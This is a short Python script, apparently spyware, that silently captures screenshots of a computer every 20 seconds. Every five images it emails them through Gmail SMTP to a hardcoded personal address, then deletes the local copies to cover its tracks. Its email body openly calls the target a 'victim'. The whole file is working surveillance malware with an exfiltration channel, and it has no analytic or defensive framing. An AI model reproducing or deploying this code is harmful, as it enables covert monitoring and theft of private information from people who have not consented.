from itertools import count
import keyboard
import pyautogui
import time, os, smtplib, shutil
from email.message import EmailMessage

def send_mail():
    try:
        msg=EmailMessage()
        msg["From"]="vinitavaswani24@gmail.com"
        msg["To"]="vinitavaswani24@gmail.com"
        msg["Subject"]="Screen_logs"
        body="Screenshots of victim's computer"
        msg.set_content(body)
        images=os.listdir("Tempshots")
        path="C:\\Tempshots\\"
        for image in images:
            file=open(path+image,"rb")
            data=file.read()
            file_name=file.name
            msg.add_attachment(data,maintype="image", subtype="p")
            file.close()
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login("vinitavaswani24@gmail.com","Enter your app password here")
        print("Successfully logged in to email account")
        server.send_message(msg)
        print("Email send")
        server.close()
        shutil.rmtree("Tempshots")
        print("Tempshots folder deleted successfully")
    except Exception as mail_error:
        shutil.rmtree("Tempshots")
        pass
count=0
os.chdir("C:\\")
if "Tempshots" in os.listdir("C:"):
    send_mail()
else:
    os.mkdir("C:Tempshots")

while True:
    if "Tempshots" not in os.listdir("C:"):
        os.mkdir("C:Tempshots")
    pic=pyautogui.screenshot()
    pic.save("C:\\Tempshots\\Screenshot_"+str(count)+".png")
    count+=1
    if count>=5:
        send_mail()
        count=0
    time.sleep(20)




